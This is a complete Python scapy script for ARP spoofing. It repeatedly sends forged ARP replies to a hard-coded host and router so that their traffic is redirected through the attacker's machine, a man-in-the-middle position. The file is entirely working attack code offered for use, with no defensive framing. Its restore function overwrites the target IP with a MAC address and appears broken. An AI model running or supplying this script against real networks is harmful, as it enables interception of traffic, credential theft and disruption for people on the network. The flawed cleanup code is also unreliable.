import time

import scapy.all as scapy

target_ip = '192.168.1.50'
router_ip = '192.168.1.1'

TIME_OUT = 40
BROADCAST_ADDRESS = 'ff:ff:ff:ff:ff:ff'

def get_mac(ip):
    request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = BROADCAST_ADDRESS)
    request_broadcast = broadcast / request
    client = scapy.srp(request_broadcast, timeout=TIME_OUT, verbose=False)[0][0][1]
    return client.hwsrc

def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip) #If you get an error change the timeout value
    arp_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = source_ip)
    scapy.send(arp_packet)

def revert_spoof(target_ip, source_ip):
    target_ip = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    arp_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_ip, psrc = source_ip, hwsrc = source_mac)
    scapy.send(arp_packet)

try:
    while True:
        spoof(router_ip, target_ip)
        spoof(target_ip, router_ip)
        time.sleep(2)

except KeyboardInterrupt:
    revert_spoof(target_ip, router_ip)
    revert_spoof(router_ip, target_ip)
